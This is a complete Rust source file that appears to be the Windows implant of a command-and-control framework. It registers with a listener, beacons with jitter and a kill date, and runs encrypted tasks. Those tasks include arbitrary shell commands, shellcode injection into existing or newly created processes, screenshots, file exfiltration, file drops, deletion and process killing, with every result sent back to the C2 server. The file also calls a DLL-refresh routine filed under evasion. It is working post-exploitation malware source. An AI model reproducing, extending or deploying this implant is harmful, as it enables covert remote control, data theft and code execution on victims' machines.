// References:
//  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
//  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
use chrono::{NaiveDateTime, Utc};
use regex::Regex;
use std::{
    fs,
    io::{Read, Write},
    thread, time
};
use url::Url;
use windows::core::{Error, HSTRING};
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};

use crate::{
    core::{
        evasion::win::dll::refresh_dlls,
        handlers::win::{
            async_handler::HRequestAsync,
            handler::{HConnect, HInternet, HRequest, HSession},
        },
        postdata::{CipherData, PlainData, RegisterAgentData},
        systeminfo::systeminfo_windows::get_computer_name,
        tasks::{
            screenshot::screenshot,
            win::{
                shell::shell,
                shellcode::{shellcode_createprocess, shellcode_openprocess},
            },
        },
    },
    Config,
    crypto::aesgcm::{cipher, decipher, EncMessage},
    utils::{
        datetime::{expires_killdate, get_killdate},
        random::{random_name, random_sleeptime},
    },
};

pub async fn run(config: Config) -> Result<(), Error> {
    if let Err(e) = refresh_dlls() {
        println!("Error refreshing DLLs {:?}", e);
    }

    let user_agent = HSTRING::from(config.listener.user_agent.to_string());

    // Parse the kill date
    let now = Utc::now().naive_utc();
    let killdate = get_killdate(config.killdate.as_str());

    // Initialize the session
    let mut hsession = HSession::new(user_agent)?;
    let mut hconnect = HConnect::new(
        &hsession,
        HSTRING::from(config.listener.host.to_string()),
        config.listener.port,
    )?;

    // Get agent info for registration
    let agent_name = random_name("agent".to_owned());
    let hostname = match get_computer_name() {
        Ok(name) => name,
        Err(_) => "unknown".to_string(),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let mut sleeptime = config.sleep.clone();

    let mut rad = RegisterAgentData::new(
        agent_name.to_string(),
        hostname.to_string(),
        os.to_string(),
        arch.to_string(),
        listener_url.to_string(),
        config.my_public_key,
    );
    let rad_json = serde_json::to_string(&rad.clone()).unwrap();

    // Agent registration process
    let mut registered = false;
    while !registered {
        thread::sleep(
            random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
        );
    
        let response = match post(
            &mut hconnect,
            config.listener.routes.register.to_string(),
            rad_json.to_string()
        ).await {
            Ok(resp) => {
                registered = true;
                resp
            }
            Err(e) => {
                continue;
            }
        };
    }

    let plaindata = PlainData::new(agent_name.to_string());
    let plaindata_json = serde_json::to_string(&plaindata).unwrap();

    loop {
        // TODO: Implement graceful shutdown.

        if expires_killdate(killdate.clone(), now.clone()) {
            break;
        }

        thread::sleep(
            random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
        );

        // Get task
        let task = match post(&mut hconnect, config.listener.routes.task_ask.to_string(), plaindata_json.to_string()).await {
            Ok(resp) => {
                if resp == "" {
                    continue;
                }

                let cipherdata: CipherData = serde_json::from_str(&resp).unwrap();
                let deciphered_task = decipher(
                    EncMessage { ciphertext: cipherdata.c, nonce: cipherdata.n },
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                );
                String::from_utf8(deciphered_task).unwrap()
            },
            Err(e) => {
                continue;
            }
        };

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "cat" => {
                match std::fs::read_to_string(task_args[1].as_str()) {
                    Ok(contents) => {
                        post_task_result(
                            &mut hconnect,
                            contents.as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }
            }
            "cd" => {
                match std::env::set_current_dir(task_args[1].as_str()) {
                    Ok(result) => {
                        post_task_result(
                            &mut hconnect,
                            "The current directory changed successfully.".as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }
            }
            "cp" => {
                let src = task_args[1].to_string();
                let dest = task_args[2].to_string();

                match fs::copy(src, dest) {
                    Ok(_) => {
                        post_task_result(
                            &mut hconnect,
                            "Copied successfully.".as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }
            }
            "download" => {
                match std::fs::File::open(task_args[1].as_str()) {
                    Ok(ref mut f) => {
                        let mut buf = Vec::new();
                        f.read_to_end(&mut buf).unwrap();
                        // Insert the filename at the top position for sending it along with the contents.
                        let f_name = task_args[1].to_string() + "\n";
                        let final_buf = [f_name.as_bytes(), &buf].concat();

                        post_task_result(
                            &mut hconnect,
                            &final_buf,
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }
            }
            "info" => {
                let mut sys = sysinfo::System::new_all();
                sys.refresh_all();

                let mut output = String::new();
                output = output + "\n";
                output = output + format!("{:<12} : {}\n", "NAME", agent_name.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "HOSTNAME", hostname.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "SYSTEM",
                    sysinfo::System::name().unwrap()).as_str();
                output = output + format!("{:<12} : {}\n", "KERNEL",
                    sysinfo::System::kernel_version().unwrap()).as_str();
                output = output + format!("{:<12} : {}\n", "OS", 
                    format!("{}/{}", os.to_string(), arch.to_string())).as_str();
                output = output + format!("{:<12} : {}\n", "LISTENER", listener_url.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "SLEEP", sleeptime.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "JITTER", config.jitter.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "KILLDATE", config.killdate.to_string()).as_str();

                post_task_result(
                    &mut hconnect,
                    output.as_bytes(),
                    agent_name.to_string(),
                    &config,
                ).await;
            }
            "ls" => {
                match std::fs::read_dir(task_args[1].as_str()) {
                    Ok(result) => {
                        let re = Regex::new(r"\\").unwrap();

                        let mut output = String::new();
                        output = output + "\n";
                        for path in result {
                            if let Ok(entry) = path {
                                let entry_name = &entry.path().to_string_lossy().to_string();
                                let entry_name = re.replace_all(entry_name, "/");
                                let entry_name = entry_name.split("/").last().unwrap().to_string();

                                if let Ok(metadata) = entry.metadata() {
                                    output = output + format!(
                                        "{:<1} {:<20} {}\n",
                                        if metadata.is_dir() { "D" } else { "F" },
                                        entry_name,
                                        metadata.len()
                                    ).as_str();
                                } else {
                                    output = output + format!(
                                        "{}", entry_name).as_str();
                                }
                            }
                        }

                        post_task_result(
                            &mut hconnect,
                            output.as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }
            }
            "mkdir" => {
                match fs::create_dir_all(task_args[1].as_str()) {
                    Ok(_) => {
                        post_task_result(
                            &mut hconnect,
                            "Directory created successfully.".as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }
            }
            "net" => {
                let mut sys = sysinfo::System::new_all();
                sys.refresh_all();

                let networks = sysinfo::Networks::new_with_refreshed_list();

                let mut output = String::new();
                output = output + "\n";
                for (interface_name, data) in &networks {
                    output = output + format!(
                        "{interface_name}:\n\t{}\n\t{}/{} B\n",
                        data.mac_address(),
                        data.received(),
                        data.transmitted()
                    ).as_str();
                }

                post_task_result(
                    &mut hconnect,
                    output.as_bytes(),
                    agent_name.to_string(),
                    &config,
                ).await;
            }
            "ps" => {
                let mut sys = sysinfo::System::new_all();
                sys.refresh_all();

                let subcommand = task_args[1].to_string();

                match subcommand.as_str() {
                    "kill" => {
                        let pid: u32 = task_args[2].parse().unwrap();

                        if let Some(process) = sys.process(sysinfo::Pid::from_u32(pid)) {
                            process.kill();

                            post_task_result(
                                &mut hconnect,
                                "The process killed successfully.".to_string().as_bytes(),
                                agent_name.to_string(),
                                &config,
                            ).await;
                        }
                    }
                    "list" => {
                        let args = task_args[2..].join(" ");
                        let fx: Vec<&str> = args.split(":").collect();
                        let filter = fx[0];
                        let exclude = fx[1];
        
                        let mut output = String::new();
                        output = output + "\n";
                        for (pid, process) in sys.processes() {
                            if  (filter == "*" && exclude == "") ||
                                (filter == "*" && !process.name().contains(exclude.clone())) ||
                                (process.name().contains(filter.clone()) && exclude == "") ||
                                (process.name().contains(filter.clone()) && !process.name().contains(exclude.clone()))
                            {
                                output = output + format!("{pid}\t{}\n", process.name()).as_str();
                            }
                        }
        
                        post_task_result(
                            &mut hconnect,
                            output.as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    _ => {
                        post_task_result(
                            &mut hconnect,
                            "Subcommand not specified.".to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }

            }
            "pwd" => {
                match std::env::current_dir() {
                    Ok(result) => {
                        post_task_result(
                            &mut hconnect,
                            &result.to_str().unwrap().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }
            }
            "rm" => {
                if task_args.len() == 2 {
                    match std::fs::remove_file(task_args[1].as_str()) {
                        Ok(_) => {
                            post_task_result(
                                &mut hconnect,
                                "File removed successfully.".as_bytes(),
                                agent_name.to_string(),
                                &config,
                            ).await;
                        }
                        Err(e) => {
                            post_task_result(
                                &mut hconnect,
                                e.to_string().as_bytes(),
                                agent_name.to_string(),
                                &config,
                            ).await;
                        }
                    }
                } else {
                    // When the `-r` flag is specified,
                    match std::fs::remove_dir_all(task_args[1].as_str()) {
                        Ok(_) => {
                            post_task_result(
                                &mut hconnect,
                                "Directory removed successfully.".as_bytes(),
                                agent_name.to_string(),
                                &config,
                            ).await;
                        }
                        Err(e) => {
                            post_task_result(
                                &mut hconnect,
                                e.to_string().as_bytes(),
                                agent_name.to_string(),
                                &config,
                            ).await;
                        }
                    }
                }
            }
            "screenshot" => {
                match screenshot().await {
                    Ok(result) => {
                        post_task_result(
                            &mut hconnect,
                            &result,
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }
            }
            "shell" => {
                match shell(task_args[1..].join(" ")).await {
                    Ok(result) => {
                        post_task_result(
                            &mut hconnect,
                            &result,
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }
            }
            "shellcode" => {
                let process_type = task_args[1].to_string();
                let shellcode_b64 = task_args[3].to_string();

                let result = match process_type.as_str() {
                    "pid" => {
                        // Open process with specified PID
                        let pid: u32 = task_args[2].parse().unwrap();
                        shellcode_openprocess(pid, shellcode_b64)
                    }
                    "process" => {
                        // Create a new process with specified process name
                        let process = task_args[2].to_string();
                        shellcode_createprocess(process, shellcode_b64)
                    }
                    _ => {
                        post_task_result(
                            &mut hconnect,
                            "Process type not specified.".to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                        continue;
                    }
                };

                match result {
                    Ok(r) => {
                        post_task_result(
                            &mut hconnect,
                            &r,
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }
            }
            "sleep" => {
                sleeptime = task_args[1].parse().unwrap();

                post_task_result(
                    &mut hconnect,
                    "The sleep time changed successfully.".as_bytes(),
                    agent_name.to_string(),
                    &config,
                ).await;
            }
            "upload" => {
                let file_to_download = task_args[1].to_string();
                let mut dest = task_args[2].to_string();
                // Adjust dest path
                if dest.as_str() == "." {
                    dest = file_to_download.split("/").last().unwrap().to_string();
                }

                let resp_data = match download(
                    &mut hconnect,
                    file_to_download.as_bytes(),
                    agent_name.to_string(),
                    &config,
                ).await {
                    Ok(d) => d,
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;

                        continue;
                    }
                };

                let mut f = match fs::File::create(dest) {
                    Ok(f) => f,
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;

                        continue;
                    }
                };

                match f.write_all(&resp_data) {
                    Ok(_) => {
                        post_task_result(
                            &mut hconnect,
                            "File uploaded successfully.".as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            &mut hconnect,
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            &config,
                        ).await;
                    }
                }

            }
            "whoami" => {
                let username = format!("{}\\{}", whoami::hostname(), whoami::username());
                post_task_result(
                    &mut hconnect,
                    username.as_bytes(),
                    agent_name.to_string(),
                    &config,
                ).await;
            }
            _ => {
                continue;
            }
        }
    }

    hconnect.h.close();
    hsession.h.close();

    Ok(())
}

async fn get(hconnect: &mut HConnect, url_path: String) -> Result<String, Error> {
    let mut hrequest = HRequest::new(
        hconnect,
        HSTRING::from("GET".to_string()),
        HSTRING::from(url_path.to_string()),
        None,
    )?;
    
    hrequest.send_req(
        HSTRING::new(),
        0,
        0)?;
    hrequest.recv_resp()?;

    let mut response = String::new();
    
    loop {
        let mut dw_size = 0;

        if let Err(e) = hrequest.query_data_available(Some(&mut dw_size)) {
            println!("Error querying data available: {}", e.to_string());
        }

        if dw_size == 0 {
            break;
        }

        let mut buffer: Vec<u8> = vec![0; dw_size as usize];

        let r = hrequest.read_data(dw_size, &mut buffer);
        match r {
            Ok(_) => {
                response = response + String::from_utf8_lossy(&buffer).to_string().as_str();
            },
            Err(e) => println!("Error: {:?}", e),
        }

        if dw_size > 0 {
            break;
        }
    }

    hrequest.h.close();

    Ok(response)
}

async fn post(
    hconnect: &mut HConnect,
    url_path: String,
    data: String
) -> Result<String, Error> {

    let hrequest = HRequest::new(
        hconnect,
        HSTRING::from("POST".to_string()),
        HSTRING::from(url_path.to_string()),
        Some(vec![HSTRING::from("application/json")]),
    )?;

    let mut hreq_async = HRequestAsync::new(hrequest);

    let headers = HSTRING::from("Content-Type: application/json".to_string());

    hreq_async.async_send_req(headers, data.len() as u32).await?;
    hreq_async.async_write_data(
        data.as_bytes(),
        data.len() as u32
    ).await?;
    hreq_async.async_recv_resp().await?;

    let mut response = String::new();

    loop {
        let dw_size = hreq_async.async_query_data_available().await?;
        if dw_size == 0 {
            break;
        }

        for _ in 0..dw_size {
            let mut temp_buf = [0 as u8];
            let buf = temp_buf.as_mut_slice();
            let len_read = hreq_async
                .async_read_data(buf.len() as u32, buf).await?;
            assert!(buf.len() == len_read as usize);
            response.push(buf[0] as char);
        }
    }
    
    hreq_async.h.h.close();

    Ok(response)
}

// Send task result to the C2 server
async fn post_task_result(
    hconnect: &mut HConnect,
    result: &[u8],
    agent_name: String,
    config: &Config,
) {
    let cipherdata = CipherData::new(
        agent_name,
        result,
        config.my_secret_key.clone(),
        config.server_public_key.clone(),
    );
    let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
    post(
        hconnect,
        config.listener.routes.task_result.to_string(),
        cipherdata_json.to_string(),
    ).await;
}

// Download a file from the C2 server
async fn download(
    hconnect: &mut HConnect,
    file_to_download: &[u8],
    agent_name: String,
    config: &Config,
) -> Result<Vec<u8>, Error> {
    let cipherdata = CipherData::new(
        agent_name,
        file_to_download,
        config.my_secret_key.clone(),
        config.server_public_key.clone(),
    );
    let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
    let resp = post(
        hconnect,
        config.listener.routes.task_upload.to_string(),
        cipherdata_json.to_string(),
    ).await.unwrap();
    Ok(resp.into_bytes())
}

// fn close_handler(h: &mut HInternet) {
//     h.close();
// }